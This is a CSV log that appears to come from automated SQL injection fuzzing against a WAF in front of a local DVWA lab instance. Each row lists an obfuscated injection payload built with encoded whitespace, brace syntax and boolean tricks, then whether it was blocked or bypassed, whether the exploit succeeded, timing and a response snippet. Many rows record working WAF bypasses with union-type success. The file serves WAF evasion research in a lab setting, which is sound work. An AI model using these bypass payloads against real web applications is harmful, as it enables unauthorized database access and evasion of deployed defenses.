Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0%27||%0b!@<@+or%0b!%0b{x+(select+1)}=1=+(!%0b{x%0b(select,Blocked,No,None,Unknown,0.033,73.77,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1%0b||+!%0b{x+(select+1)}=1=%0b(!+{`if`+1}=1)+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0266,73.89,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1+or+!+{x+(select+1)}=1=%0b(not%0b{x+(select+1)}=1,Blocked,No,None,Unknown,0.0447,74.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=.1+||%0bnot%7efalse=%0b(not+{x+(select%0b1)}=1)+||%27,Blocked,No,None,Unknown,0.0135,74.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.+or%0b!%7e0=%0b(!%0b{x+(select+1)}=1)+||%27,Bypassed,No,None,Unknown,0.0222,74.01,No,500,
0'<@=.1+||+not+1=+(not%0b1)+or%27,Bypassed,No,None,Unknown,0.0271,74.01,No,500,
0'<@!=1.%0b||+!%0b{a+1}=1+is%0bfalse%0b||',Bypassed,No,None,Unknown,0.0244,74.01,No,500,
0%27<@=1.%0b||%0bnot%0b{`if`+1}=1=+(not%7efalse)--%0b,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0509,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+or%0b!+{x+(select%0b1)}=1=+(not+{a+1}=1)--,Blocked,No,None,piggyAtk,0.0184,74.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1+||+not+{`if`%0b1}=1=%0b(not%7efalse)%0bor',Bypassed,No,None,booleanAtk,0.0158,74.01,No,500,
0%27<@=1.%0bor%0b0=+(not%0b{x%0b(select+1)}=1)+||',Bypassed,No,None,Unknown,0.0193,74.01,No,500,
0%27<@!=.1%0bor+not+{a%0b1}=1=+(not+1)%0b||',Bypassed,No,None,Unknown,0.0215,74.01,No,500,
0%27<@=1%0b||+!%7efalse=%0b(!+{`if`+1}=1)%0b||',Bypassed,No,None,Unknown,0.0306,74.01,No,500,
0%27<@!=.1%0bor+not%7e0=+(!%7efalse)%23,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0288,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1%0bor+!%0b{`if`%0b1}=1=%0b(not%0b{`if`+1}=1)+||',Bypassed,No,None,Unknown,0.0212,74.01,No,500,
0'<@!=1.%0bor%0bnot%0b{x+(select%0b1)}=1=+(!%0b{`if`%0b1}=1)%0b,Bypassed,No,None,Unknown,0.0294,74.01,No,500,
0'<@=1%0bor+!+{x+(select+1)}=1=%0b(not+{`if`%0b1}=1)%0b,Bypassed,No,None,Unknown,0.0288,74.01,No,500,
0%27<@=.1+or%0b!~0=+(not+{x+(select%0b1)}=1)+||',Blocked,No,None,Unknown,0.0164,74.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1+||+!%0b{x+(select+1)}=1=%0b(!+{x+(select%0b1)}=1),Bypassed,No,None,Unknown,0.0344,74.01,No,500,
0%27<@=.1+or+!+1=+(not+1)+||',Bypassed,No,None,Unknown,0.0314,74.01,No,500,
0'<@=1.+or%0b!%0btrue=+(not%0b{`if`+1}=1)+||%27,Blocked,No,None,booleanAtk,0.0254,74.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'or%0b@<@%0bor+{x+(select+1)}=1%0blike+{`if`%0b1}=1%0bor',Bypassed,No,None,Unknown,0.0465,74.01,No,500,
0'<@=1%0bor%0bnot+1=+(!~0)+||%27,Bypassed,No,None,Unknown,0.0343,74.01,No,500,
0%27<@=1.+||+not+{`if`%0b1}=1=+(!+{x+(select+1)}=1)+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0207,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+||%0b{a%0b1}=1+like%0b{x+(select+1)}=1%0bor%27,Bypassed,No,None,Unknown,0.04,73.77,No,500,
0%27<@=1%0b||+!%0b{x+(select%0b1)}=1=%0b(false)--+,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0223,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1%0bor+!%0b{`if`%0b1}=1=+(!%0btrue)+||',Bypassed,No,None,booleanAtk,0.0277,73.77,No,500,
0%27<@!=1%0b||+not+{a%0b1}=1=%0b(not%0b{a+1}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0175,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+||%0b!+{`if`%0b1}=1=%0b(not+{a%0b1}=1)%23,Bypassed,No,None,piggyAtk,0.0514,73.77,No,500,
0%27<@!=1.%0b||+not+{x+(select%0b1)}=1=%0b(!+1)%0bor',Bypassed,No,None,Unknown,0.0479,73.77,No,500,
0%27<@!=1+or+!+{`if`%0b1}=1=+(not+{a%0b1}=1)+or',Bypassed,No,None,Unknown,0.0382,73.77,No,500,
0%27<@=1%0bor+!+{`if`%0b1}=1=%0b(!%0b{x+(select+1)}=1)+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0213,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+||%0bnot+1=+(!%0b{x+(select%0b1)}=1)%0bor',Bypassed,No,None,Unknown,0.0246,73.77,No,500,
0'<@!=1.+or+not%7e0=%0b(not~false)+or',Blocked,No,None,booleanAtk,0.022,73.77,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1.%0bor%0bnot+{x%0b(select+1)}=1=+(not+{a+1}=1)%0b,Bypassed,Yes,Yes (unionAtk),Unknown,0.0322,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1%0bor+not%0b{`if`%0b1}=1=+(not%0b{a%0b1}=1)--+,Bypassed,No,None,piggyAtk,0.0214,73.77,No,500,
0'<@=1%0b||%0b!%0b{x+(select+1)}=1=%0b(not+{x%0b(select+1)}=1),Bypassed,No,None,Unknown,0.0237,73.77,No,500,
0'<@!=1%0bor+!%0b{`if`%0b1}=1=+(not+{x%0b(select+1)}=1)+,Bypassed,No,None,Unknown,0.0188,73.77,No,500,
0%27<@!=1+or+not+{x+(select%0b1)}=1=+(!+{x%0b(select+1)}=1),Blocked,No,None,Unknown,0.0129,73.77,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=.1%0bor+not+{a%0b1}=1=+(!+{x+(select%0b1)}=1)+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0173,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0b||%0b!+{x+(select%0b1)}=1=+(!+{x%0b(select%0b1)}=1),Bypassed,Yes,Yes (unionAtk),Unknown,0.0179,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1%0bor+!+{a%0b1}=1=%0b(not%0b{x%0b(select%0b1)}=1)%23,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0179,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1%0b||+!%0b{a+1}=1=+(!+true)+or%27,Bypassed,No,None,booleanAtk,0.0367,73.77,No,500,
0%27<@!=1.%0b||+!+{x%0b(select+1)}=1=+(not+{x+(select+1)}=1),Bypassed,Yes,Yes (unionAtk),Unknown,0.0284,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1+||%0bnot+{a%0b1}=1=+(not%0b{a+1}=1)+||%27,Bypassed,No,None,Unknown,0.0259,73.77,No,500,
0'<@=1.+or%0b!+{`if`%0b1}=1=+(!+{a+1}=1)--+,Bypassed,No,None,piggyAtk,0.0209,73.77,No,500,
0'<@=1+or%0bnot+{x+(select%0b1)}=1=%0b(!%0b{`if`+1}=1)+,Blocked,No,None,Unknown,0.0228,74.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1+or+!+{a+1}=1=%0b(!+{x+(select%0b1)}=1)+,Bypassed,Yes,Yes (unionAtk),Unknown,0.017,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1+||+not+true=+(!%0b{x+(select%0b1)}=1)+or%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0299,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+||%0bnot%0b{x%0b(select+1)}=1=+(false)+or%27,Blocked,No,None,booleanAtk,0.0164,74.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1+or+!+{a%0b1}=1=+(!%0b{`if`%0b1}=1)+or',Bypassed,No,None,Unknown,0.0252,74.01,No,500,
0%27<@=1.+||+not%0b{`if`%0b1}=1=+(!%0btrue)%0b||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.026,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1+or%0bnot+{a+1}=1=+(!%0btrue)+||',Bypassed,No,None,booleanAtk,0.0301,74.01,No,500,
0'<@=1.+or+{a%0b1}=1+like%0b{x%0b(select%0b1)}=1%0bor',Blocked,No,None,Unknown,0.0152,74.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1.+or%0bnot%0b{x+(select%0b1)}=1=%0b(not%0b{x+(select+1)}=1),Blocked,No,None,Unknown,0.0202,74.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=.1+||+0=+(!%7e0)+||',Bypassed,No,None,Unknown,0.0184,74.01,No,500,
0'<@=1%0bor%0b!%0b{x%0b(select+1)}=1=+(not+{x%0b(select%0b1)}=1),Bypassed,No,None,Unknown,0.0211,74.01,No,500,
0'<@!=1.+||%0bnot%0b1=%0b(not+{x%0b(select%0b1)}=1)+or%27,Bypassed,No,None,Unknown,0.0185,74.01,No,500,
0%27<@=1%0bor%0b!%0b{x+(select%0b1)}=1=%0b(!%0b{x%0b(select%0b1)}=1,Bypassed,Yes,Yes (unionAtk),Unknown,0.0411,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1%0b||+{x+(select%0b1)}=1+like+{x%0b(select+1)}=1+or%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0187,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1%0b||%0b!%0b{`if`%0b1}=1=+(not+{a+1}=1)+or',Bypassed,No,None,Unknown,0.0209,74.01,No,500,
0'<@!=1+or%0bnot%0b{`if`%0b1}=1=+(not+{a+1}=1)%0b||%27,Bypassed,No,None,Unknown,0.0214,74.01,No,500,
0'<@!=1.+||%0b{x+(select+1)}=1%0blike%0b{x%0b(select%0b1)}=1+||%27,Bypassed,No,None,Unknown,0.0111,74.01,No,500,
0'<@=1.%0b||%0b{a+1}=1+like+{a%0b1}=1%0bor%27,Bypassed,No,None,Unknown,0.024,74.01,No,500,
0%27<@=1+or%0b!+true=+(not+{a+1}=1)+or%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0276,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+||+!+{x+(select%0b1)}=1=+(!+{x%0b(select%0b1)}=1),Blocked,No,None,Unknown,0.0166,74.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1+or+!%7e0=+(!%0b{x+(select+1)}=1)%0b||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0271,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+||+!%0b{x+(select+1)}=1=+(not%0btrue)+or%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0246,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+or%0bnot+1=+(not+{x+(select%0b1)}=1)%23,Blocked,No,None,piggyAtk,0.0063,74.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=.1+or%0bnot%0b{x+(select+1)}=1=+(!+{x+(select+1)}=1),Blocked,No,None,Unknown,0.0177,74.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.+||+!+{a+1}=1=+(not%7e0)+or%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0297,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+or+!%0b{x+(select+1)}=1=+(!+{a%0b1}=1)+,Bypassed,Yes,Yes (unionAtk),Unknown,0.036,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0b||+!%7e0=+(not+true)+or%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0243,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+||%0b!+{x%0b(select%0b1)}=1=+(!+{x+(select%0b1)}=1,Bypassed,No,None,Unknown,0.0319,74.01,No,500,
0'<@!=1+or+{`if`+1}=1+like%0b{x+(select+1)}=1+or',Bypassed,No,None,Unknown,0.021,73.77,No,500,
0'<@!=1.+or+!%7efalse=%0b(not+{x%0b(select+1)}=1)+or%27,Bypassed,No,None,booleanAtk,0.0222,73.77,No,500,
0%27<@!=.1+||%0b!~false=+(not%0btrue)+or%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.025,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0b||+!+{a+1}=1=+(not%0b{x+(select+1)}=1)%0b,Bypassed,No,None,Unknown,0.0281,73.77,No,500,
0'<@=1.%0b||+not%0b1=+(not%0b{x+(select+1)}=1)+||%27,Bypassed,No,None,Unknown,0.0389,73.77,No,500,
0'<@!=1+||+{a+1}=1+like+1+or%27,Bypassed,No,None,Unknown,0.0553,73.77,No,500,
0'<@!=1.%0bor%0bnot%0b1=%0b(!~0)%0bor%27,Bypassed,No,None,Unknown,0.0201,73.77,No,500,
